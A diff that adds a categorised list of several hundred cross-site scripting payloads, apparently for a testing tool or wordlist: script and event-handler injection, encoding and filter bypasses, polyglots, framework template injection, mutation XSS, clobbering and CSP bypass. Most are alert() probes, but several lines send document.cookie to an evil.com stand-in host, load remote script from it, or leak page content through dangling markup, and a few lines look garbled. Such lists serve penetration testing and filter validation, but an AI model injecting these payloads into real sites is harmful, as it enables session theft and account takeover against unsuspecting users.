@@ -1,0 +1,570 @@
+# XSS Payloads - Comprehensive Collection (500+)
+# Categories: Basic, Event Handlers, Encoding, Polyglot, Filter Bypass, DOM-based, Framework-specific
+
+# ==================== BASIC SCRIPT INJECTION ====================
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>prompt('XSS')</script>
+<script>confirm('XSS')</script>
+<script>console.log('XSS')</script>
+<script>document.write('XSS')</script>
+<script>window.location='http://evil.com'</script>
+<script>eval('alert(1)')</script>
+<script>new Function('alert(1)')()</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setInterval('alert(1)',1000)</script>
+<script>fetch('http://evil.com?c='+document.cookie)</script>
+<script>navigator.sendBeacon('http://evil.com',document.cookie)</script>
+<script>import('http://evil.com/evil.js')</script>
+<script type="text/javascript">alert('XSS')</script>
+<script language="javascript">alert('XSS')</script>
+<script src="http://evil.com/evil.js"></script>
+<script src="data:text/javascript,alert('XSS')"></script>
+<script src="data:application/javascript,alert('XSS')"></script>
+<script>alert`XSS`</script>
+<script>alert&#40;'XSS'&#41;</script>
+<script>alert&lpar;'XSS'&rpar;</script>
+
+# ==================== IMG TAG ====================
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.cookie)>
+<img src="x" onerror="alert('XSS')">
+<img src='x' onerror='alert(1)'>
+<img/src=x onerror=alert('XSS')>
+<img src=x onerror="alert`XSS`">
+<img src=x onerror=confirm('XSS')>
+<img src=x onerror=prompt('XSS')>
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+<img src=x onload=alert('XSS')>
+<img src=valid.jpg onload=alert('XSS')>
+<img src=1 onerror=alert('XSS')>
+<img src="" onerror=alert('XSS')>
+<img src onerror=alert('XSS')>
+<img src=x:alert(1) onerror=eval(src)>
+<img src="javascript:alert('XSS')">
+<img dynsrc="javascript:alert('XSS')">
+<img lowsrc="javascript:alert('XSS')">
+<img src=x onerror=\u0061lert('XSS')>
+<img src=x onerror=&#97;lert('XSS')>
+<img src=x onerror="&#x61;lert('XSS')">
+
+# ==================== SVG TAG ====================
+<svg onload=alert('XSS')>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)>
+<svg onload="alert('XSS')">
+<svg/onload="alert`XSS`">
+<svg onload=confirm('XSS')>
+<svg onload=prompt('XSS')>
+<svg><script>alert('XSS')</script></svg>
+<svg><script>alert&lpar;'XSS'&rpar;</script></svg>
+<svg><animate onbegin=alert('XSS')>
+<svg><animate attributeName=x onend=alert('XSS')>
+<svg><set onbegin=alert('XSS')>
+<svg><set attributeName=x onend=alert('XSS')>
+<svg><handler onload=alert('XSS')>
+<svg onload=eval(atob('YWxlcnQoMSk='))>
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
+<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>
+<svg><foreignObject><script>alert('XSS')</script></foreignObject></svg>
+<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert('XSS')"><text>click</text></a></svg>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert('XSS')</script></svg>#x">
+
+# ==================== BODY TAG ====================
+<body onload=alert('XSS')>
+<body onload="alert('XSS')">
+<body onpageshow=alert('XSS')>
+<body onfocus=alert('XSS')>
+<body onhashchange=alert('XSS')>
+<body onresize=alert('XSS')>
+<body onscroll=alert('XSS')>
+<body onunload=alert('XSS')>
+<body onbeforeunload=alert('XSS')>
+<body background="javascript:alert('XSS')">
+<body onafterprint=alert('XSS')>
+<body onbeforeprint=alert('XSS')>
+<body onerror=alert('XSS')>
+<body onmessage=alert('XSS')>
+<body onoffline=alert('XSS')>
+<body ononline=alert('XSS')>
+<body onpopstate=alert('XSS')>
+<body onstorage=alert('XSS')>
+
+# ==================== INPUT TAG ====================
+<input onfocus=alert('XSS') autofocus>
+<input onblur=alert('XSS') autofocus><input autofocus>
+<input onfocus="alert('XSS')" autofocus>
+<input type=text onfocus=alert('XSS') autofocus>
+<input type=text value="" onfocus=alert('XSS') autofocus>
+<input type=image src=x onerror=alert('XSS')>
+<input type=image src=x:x onerror=alert('XSS')>
+<input onmouseover=alert('XSS')>
+<input onmouseout=alert('XSS')>
+<input onclick=alert('XSS')>
+<input ondblclick=alert('XSS')>
+<input onkeydown=alert('XSS')>
+<input onkeyup=alert('XSS')>
+<input onkeypress=alert('XSS')>
+<input onchange=alert('XSS')>
+<input oninput=alert('XSS')>
+<input onsearch=alert('XSS') type=search autofocus>
+<input formaction="javascript:alert('XSS')" type=submit>
+<input type="hidden" accesskey="X" onclick="alert('XSS')">
+
+# ==================== OTHER HTML TAGS ====================
+<marquee onstart=alert('XSS')>
+<marquee onfinish=alert('XSS')>
+<marquee onbounce=alert('XSS')>
+<video src=x onerror=alert('XSS')>
+<video><source onerror=alert('XSS')>
+<video poster=javascript:alert('XSS')>
+<audio src=x onerror=alert('XSS')>
+<audio><source onerror=alert('XSS')>
+<details open ontoggle=alert('XSS')>
+<details ontoggle=alert('XSS') open>
+<select onfocus=alert('XSS') autofocus>
+<select onblur=alert('XSS')>
+<textarea onfocus=alert('XSS') autofocus>
+<textarea onblur=alert('XSS')>
+<keygen onfocus=alert('XSS') autofocus>
+<frameset onload=alert('XSS')>
+<table background="javascript:alert('XSS')">
+<td background="javascript:alert('XSS')">
+<div onwheel=alert('XSS')>test</div>
+<div onmouseover=alert('XSS')>hover</div>
+<div onmouseout=alert('XSS')>leave</div>
+<div onclick=alert('XSS')>click</div>
+<div ondblclick=alert('XSS')>dblclick</div>
+<div oncontextmenu=alert('XSS')>rightclick</div>
+<div ondrag=alert('XSS') draggable=true>drag</div>
+<div ondragstart=alert('XSS') draggable=true>drag</div>
+<div ondrop=alert('XSS')>drop</div>
+<p onmouseover=alert('XSS')>hover</p>
+<span onmouseover=alert('XSS')>hover</span>
+<button onclick=alert('XSS')>click</button>
+<button onfocus=alert('XSS') autofocus>
+<a onmouseover=alert('XSS')>hover</a>
+<a onfocus=alert('XSS') autofocus tabindex=1>focus</a>
+<object data="javascript:alert('XSS')">
+<object type="text/html" data="data:text/html,<script>alert('XSS')</script>">
+<embed src="javascript:alert('XSS')">
+<embed src="data:text/html,<script>alert('XSS')</script>">
+<applet code="javascript:alert('XSS')">
+<base href="javascript:alert('XSS')">
+<bgsound src="javascript:alert('XSS')">
+<link rel="import" href="data:text/html,<script>alert('XSS')</script>">
+<meta http-equiv="refresh" content="0;javascript:alert('XSS')">
+<meta http-equiv="refresh" content="0;url=data:text/html,<script>alert('XSS')</script>">
+<form action="javascript:alert('XSS')"><input type=submit>
+<isindex action="javascript:alert('XSS')">
+<math><maction actiontype="statusline" xlink:href="javascript:alert('XSS')">click</maction></math>
+<xmp><script>alert('XSS')</script></xmp>
+
+# ==================== IFRAME TAG ====================
+<iframe src="javascript:alert('XSS')">
+<iframe src="javascript:alert('XSS')"></iframe>
+<iframe src=javascript:alert('XSS')>
+<iframe src="data:text/html,<script>alert('XSS')</script>">
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
+<iframe srcdoc="<script>alert('XSS')</script>">
+<iframe srcdoc="&lt;script&gt;alert('XSS')&lt;/script&gt;">
+<iframe onload=alert('XSS')>
+<iframe onload="alert('XSS')">
+<iframe src=x onload=alert('XSS')>
+<iframe/src="data:text/html,<script>alert('XSS')</script>">
+
+# ==================== ANCHOR TAG ====================
+<a href="javascript:alert('XSS')">click</a>
+<a href="javascript:alert(1)">click</a>
+<a href="javascript:confirm('XSS')">click</a>
+<a href=javascript:alert('XSS')>click</a>
+<a href="jAvAsCrIpT:alert('XSS')">click</a>
+<a href="JAVASCRIPT:alert('XSS')">click</a>
+<a href="java&#x0A;script:alert('XSS')">click</a>
+<a href="java&#x0D;script:alert('XSS')">click</a>
+<a href="java&#x09;script:alert('XSS')">click</a>
+<a href="&#x6A;avascript:alert('XSS')">click</a>
+<a href="&#106;avascript:alert('XSS')">click</a>
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert('XSS')">click</a>
+<a href="data:text/html,<script>alert('XSS')</script>">click</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">click</a>
+<a href="vbscript:alert('XSS')">click</a>
+<a xlink:href="javascript:alert('XSS')">click</a>
+<a href="#" onclick="alert('XSS')">click</a>
+<a href="#" onfocus="alert('XSS')" tabindex=1>focus</a>
+
+# ==================== STYLE INJECTION ====================
+<style>@import'javascript:alert("XSS")';</style>
+<style>body{background:url('javascript:alert("XSS")')}</style>
+<style>*{behavior:url(evil.htc)}</style>
+<style>*{-moz-binding:url("http://evil.com/evil.xml#xss")}</style>
+<div style="background:url('javascript:alert(1)')">
+<div style="xss:expression(alert('XSS'))">
+<div style="behavior:url(evil.htc)">
+<div style="-moz-binding:url('http://evil.com/evil.xml#xss')">
+<span style="color:expression(alert('XSS'))">
+<p style="width:expression(alert('XSS'))">
+
+# ==================== EVENT HANDLER VARIANTS ====================
+<img src=x onerror=alert('XSS')>
+<img src=x onError=alert('XSS')>
+<img src=x ONERROR=alert('XSS')>
+<img src=x OnError=alert('XSS')>
+<img src=x onerror =alert('XSS')>
+<img src=x onerror= alert('XSS')>
+<img src=x onerror = alert('XSS')>
+<img src=x onerror
+=alert('XSS')>
+<img src=x onerror=
+alert('XSS')>
+<img src=x onerror	=alert('XSS')>
+
+# ==================== ENCODING BYPASS ====================
+<script>alert('XSS')</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<script>\u0061lert('XSS')</script>
+<script>\x61lert('XSS')</script>
+<script>eval('\x61lert(1)')</script>
+<script>eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<img src=x onerror="\u0061lert('XSS')">
+<img src=x onerror="&#97;lert('XSS')">
+<img src=x onerror="&#x61;lert('XSS')">
+<img src=x onerror="al\u0065rt('XSS')">
+<img src=x onerror="\141\154\145\162\164\50\61\51">
+%3Cscript%3Ealert('XSS')%3C/script%3E
+%3Cimg%20src=x%20onerror=alert('XSS')%3E
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
+<script>&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;</script>
+<script>&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;</script>
+
+# ==================== FILTER BYPASS - QUOTES ====================
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(`XSS`)</script>
+<script>alert(/XSS/)</script>
+<script>alert(1)</script>
+<script>alert(0x58)</script>
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert("XSS")>
+<img src=x onerror=alert(`XSS`)>
+<img src=x onerror=alert(1)>
+<img src=x onerror='alert(1)'>
+<img src=x onerror="alert(1)">
+
+# ==================== FILTER BYPASS - PARENTHESES ====================
+<script>alert`XSS`</script>
+<script>onerror=alert;throw 1</script>
+<script>{onerror=alert}throw 1</script>
+<script>throw onerror=alert,'XSS'</script>
+<img src=x onerror=alert`XSS`>
+<img src=x onerror="window['alert'](1)">
+<img src=x onerror="window.alert(1)">
+<img src=x onerror="self['alert'](1)">
+<img src=x onerror="top['alert'](1)">
+<img src=x onerror="parent['alert'](1)">
+<img src=x onerror="this['alert'](1)">
+
+# ==================== FILTER BYPASS - SCRIPT TAG ====================
+<ScRiPt>alert('XSS')</ScRiPt>
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<script x>alert('XSS')</script>
+<script >alert('XSS')</script>
+<script	>alert('XSS')</script>
+<script
+>alert('XSS')</script>
+<script/x>alert('XSS')</script>
+<<script>alert('XSS')//<</script>
+<script src=1 href=1 onerror=alert('XSS')></script>
+</script><script>alert('XSS')</script>
+<script>/**/alert('XSS')/**/</script>
+<script><!--alert('XSS')//--></script>
+<script>alert/**/('XSS')</script>
+<script>al\u0065rt('XSS')</script>
+<script>top['al'+'ert']('XSS')</script>
+<script>window['al'+'ert']('XSS')</script>
+
+# ==================== FILTER BYPASS - IMG TAG ====================
+<IMG SRC=x onerror=alert('XSS')>
+<img/src=x/onerror=alert('XSS')>
+<img	src=x	onerror=alert('XSS')>
+<img
+src=x
+onerror=alert('XSS')>
+<img src="x" onerror="alert('XSS')">
+<img src='x' onerror='alert(1)'>
+<img """><script>alert('XSS')</script>">
+<img src=`x` onerror=`alert('XSS')`>
+<img src=x onerror=a]lert('XSS')//
+<img src=x onerror=\u0061lert('XSS')>
+<img src=x onerror=al\u0065rt('XSS')>
+<img src=x onerror=top['al'+'ert'](1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=self['\x61lert'](1)>
+
+# ==================== NULL BYTE INJECTION ====================
+<scr%00ipt>alert('XSS')</script>
+<script%00>alert('XSS')</script>
+<img src=x on%00error=alert('XSS')>
+<img src%00=x onerror=alert('XSS')>
+<img/src=x%00onerror=alert('XSS')>
+perl -e 'print "<IMG SRC=java\0teleport:alert(\"XSS\")>";'
+
+# ==================== JAVASCRIPT PROTOCOL ====================
+javascript:alert('XSS')
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:void(alert('XSS'))
+javascript://%0Aalert('XSS')
+javascript://comment%0Aalert('XSS')
+javascript:/**/alert('XSS')
+javascript:x]alert('XSS')//
+JaVaScRiPt:alert('XSS')
+JAVASCRIPT:alert('XSS')
+java
+script:alert('XSS')
+java	script:alert('XSS')
+java\0script:alert('XSS')
+data:text/html,<script>alert('XSS')</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+vbscript:alert('XSS')
+
+# ==================== POLYGLOT PAYLOADS ====================
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23teleport;)>'"><img src="http://i.imgur.com/P8mL8.jpg">
+" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
+'"--></style></script><script>alert(1)</script>
+'"><script>alert(1)</script>
+"><svg onload=alert(1)//
+'><svg/onload=alert('XSS')>
+" onfocus=alert(1) autofocus="
+'><img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+--><script>alert(1)</script>
+*/alert(1)/*
+*/alert(1)//
+--!><script>alert(1)</script>
+<svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+"'><img src=x onerror=alert(1)>
+'"--><img src=x onerror=alert(1)>
+
+# ==================== CONTEXT-SPECIFIC ====================
+# Inside script block
+'-alert(1)-'
+"-alert(1)-"
+;alert(1)//
+\'-alert(1)//
+\"-alert(1)//
+\";alert(1)//
+\';alert(1)//
+
+# Inside attribute
+" onmouseover="alert(1)
+' onmouseover='alert(1)
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+" onclick="alert(1)
+' onclick='alert(1)
+
+# Inside href
+javascript:alert(1)
+java%0d%0ascript:alert(1)
+java%09script:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# Inside style
+</style><script>alert(1)</script>
+};alert(1);{
+</style><img src=x onerror=alert(1)>
+
+# Inside comment
+--><script>alert(1)</script>
+--!><script>alert(1)</script>
+-->*/alert(1)/*
+
+# ==================== DOM XSS ====================
+#<img src=x onerror=alert(1)>
+?search=<script>alert(1)</script>
+?q="><script>alert(1)</script>
+?name=<img src=x onerror=alert(1)>
+?redirect=javascript:alert(1)
+?url=data:text/html,<script>alert(1)</script>
+?callback=alert(1)//
+?jsonp=alert(1)//
+
+# ==================== ANGULAR JS ====================
+{{constructor.constructor('alert(1)')()}}
+{{$on.constructor('alert(1)')()}}
+{{[].map.constructor('alert(1)')()}}
+{{'a'.constructor.prototype.charAt=[].join;$eval('x]alert(1)//');}}
+{{$eval.constructor('alert(1)')()}}
+{{a]constructor.constructor('alert(1)')()}}
+{{''.constructor.constructor('alert(1)')()}}
+{{toString().constructor.constructor('alert(1)')()}}
+
+# ==================== VUE JS ====================
+{{constructor.constructor('alert(1)')()}}
+{{$el.ownerDocument.defaultView.alert(1)}}
+
+# ==================== REACT ====================
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+
+# ==================== ADDITIONAL OBFUSCATION ====================
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>[]['filter']['constructor']('alert(1)')()</script>
+<script>self['alert'](1)</script>
+<script>top['alert'](1)</script>
+<script>frames['alert'](1)</script>
+<script>content['alert'](1)</script>
+<script>window['alert'](1)</script>
+<script>this['alert'](1)</script>
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+<script>eval.call(null,'alert(1)')</script>
+<script>eval.apply(null,['alert(1)'])</script>
+<script>Reflect.apply(eval,null,['alert(1)'])</script>
+<script>eval?.('alert(1)')</script>
+<script>(()=>alert(1))()</script>
+<script>(function(){alert(1)})()</script>
+<script>+alert(1)</script>
+<script>-alert(1)</script>
+<script>!alert(1)</script>
+<script>~alert(1)</script>
+<script>void alert(1)</script>
+<script>typeof alert(1)</script>
+<script>delete alert(1)</script>
+
+# ==================== MUTATION XSS ====================
+<noscript><p title="</noscript><script>alert(1)</script>">
+<p><style><script>alert(1)</script></style></p>
+<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>
+<xmp><img src=1 onerror=alert(1)></xmp>
+<math><mtext><table><mglyph><style><img src=1 onerror=alert(1)>
+<svg><p><style><g id="</style><img src=1 onerror=alert(1)>">
+<form><math><mtext></form><form><mglyph><style></math><img src=1 onerror=alert(1)>
+
+# ==================== CLOBBERING ====================
+<form id=x><input id=y></form><form id=x><input id=y>
+<form id=location href=javascript:alert(1)><input type=submit>
+<form id=document><input name=domain value=x>
+
+# ==================== DANGLING MARKUP ====================
+<img src='http://evil.com/log?
+<a href='http://evil.com/log?
+<base href='http://evil.com/'>
+
+# ==================== CSP BYPASS ====================
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script><div ng-app>{{constructor.constructor('alert(1)')()}}</div>
+<script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert"></script>
+<link rel="prefetch" href="http://evil.com">
+<link rel="preload" href="http://evil.com" as="script">
+
+# ==================== SPECIAL CHARACTERS ====================
+<script>alert('XSS')</script>
+<script>alert('XSS')</script>
+<script>alert('XSS')</script>
+<script>alert('XSS')</script>
+<script>alert('XSS')</script>
+<script>alert('XSS')</script>
+<script>alert﴾'XSS'﴿</script>
+<script>alert⁽'XSS'⁾</script>
+<img src=x onerror="alert('XSS')">
+<img src=x onerror="alert('XSS')">
+<img src=x onerror="alert('XSS')">
+
+# ==================== LESS COMMON TAGS ====================
+<animate onbegin=alert(1) attributeName=x>
+<custom contenteditable onblur=alert(1) tabindex=1>
+<dfn onfocus=alert(1) contenteditable tabindex=1>
+<abbr onfocus=alert(1) contenteditable tabindex=1>
+<q onfocus=alert(1) contenteditable tabindex=1>
+<cite onfocus=alert(1) contenteditable tabindex=1>
+<data onfocus=alert(1) contenteditable tabindex=1>
+<time onfocus=alert(1) contenteditable tabindex=1>
+<code onfocus=alert(1) contenteditable tabindex=1>
+<var onfocus=alert(1) contenteditable tabindex=1>
+<samp onfocus=alert(1) contenteditable tabindex=1>
+<kbd onfocus=alert(1) contenteditable tabindex=1>
+<sub onfocus=alert(1) contenteditable tabindex=1>
+<sup onfocus=alert(1) contenteditable tabindex=1>
+<i onfocus=alert(1) contenteditable tabindex=1>
+<b onfocus=alert(1) contenteditable tabindex=1>
+<u onfocus=alert(1) contenteditable tabindex=1>
+<mark onfocus=alert(1) contenteditable tabindex=1>
+<ruby onfocus=alert(1) contenteditable tabindex=1>
+<rt onfocus=alert(1) contenteditable tabindex=1>
+<rp onfocus=alert(1) contenteditable tabindex=1>
+<bdi onfocus=alert(1) contenteditable tabindex=1>
+<bdo onfocus=alert(1) contenteditable tabindex=1>
+<wbr onfocus=alert(1) contenteditable tabindex=1>
+<ins onfocus=alert(1) contenteditable tabindex=1>
+<del onfocus=alert(1) contenteditable tabindex=1>
+<s onfocus=alert(1) contenteditable tabindex=1>
+<small onfocus=alert(1) contenteditable tabindex=1>
+<em onfocus=alert(1) contenteditable tabindex=1>
+<strong onfocus=alert(1) contenteditable tabindex=1>
+<section onfocus=alert(1) contenteditable tabindex=1>
+<nav onfocus=alert(1) contenteditable tabindex=1>
+<article onfocus=alert(1) contenteditable tabindex=1>
+<aside onfocus=alert(1) contenteditable tabindex=1>
+<header onfocus=alert(1) contenteditable tabindex=1>
+<footer onfocus=alert(1) contenteditable tabindex=1>
+<address onfocus=alert(1) contenteditable tabindex=1>
+<main onfocus=alert(1) contenteditable tabindex=1>
+<figure onfocus=alert(1) contenteditable tabindex=1>
+<figcaption onfocus=alert(1) contenteditable tabindex=1>
+<output onfocus=alert(1)>
+<summary onfocus=alert(1)>
+
+# ==================== MOBILE/TOUCH EVENTS ====================
+<div ontouchstart=alert(1)>touch</div>
+<div ontouchend=alert(1)>touch</div>
+<div ontouchmove=alert(1)>touch</div>
+<div ontouchcancel=alert(1)>touch</div>
+<div onpointerdown=alert(1)>pointer</div>
+<div onpointerup=alert(1)>pointer</div>
+<div onpointermove=alert(1)>pointer</div>
+<div onpointerenter=alert(1)>pointer</div>
+<div onpointerleave=alert(1)>pointer</div>
+<div onpointerover=alert(1)>pointer</div>
+<div onpointerout=alert(1)>pointer</div>
+
+# ==================== FILE/CLIPBOARD EVENTS ====================
+<input type=file onchange=alert(1)>
+<div oncopy=alert(1)>copy</div>
+<div oncut=alert(1)>cut</div>
+<div onpaste=alert(1)>paste</div>
+
+# ==================== PRINT/MEDIA EVENTS ====================
+<body onafterprint=alert(1)>
+<body onbeforeprint=alert(1)>
+<audio oncanplay=alert(1)><source src=x.mp3>
+<video oncanplay=alert(1)><source src=x.mp4>
+<audio onended=alert(1)><source src=x.mp3>
+<video onended=alert(1)><source src=x.mp4>
+<audio onpause=alert(1)><source src=x.mp3>
+<video onpause=alert(1)><source src=x.mp4>
+<audio onplay=alert(1)><source src=x.mp3>
+<video onplay=alert(1)><source src=x.mp4>
+<audio onplaying=alert(1)><source src=x.mp3>
+<video onplaying=alert(1)><source src=x.mp4>
+
+# ==================== RECURSIVE/NESTED ====================
+<script><script>alert(1)</script></script>
+<script><!--<script>alert(1)//--></script>
+<img src="<img src=x onerror=alert(1)>">
+<div><div><div><img src=x onerror=alert(1)></div></div></div>
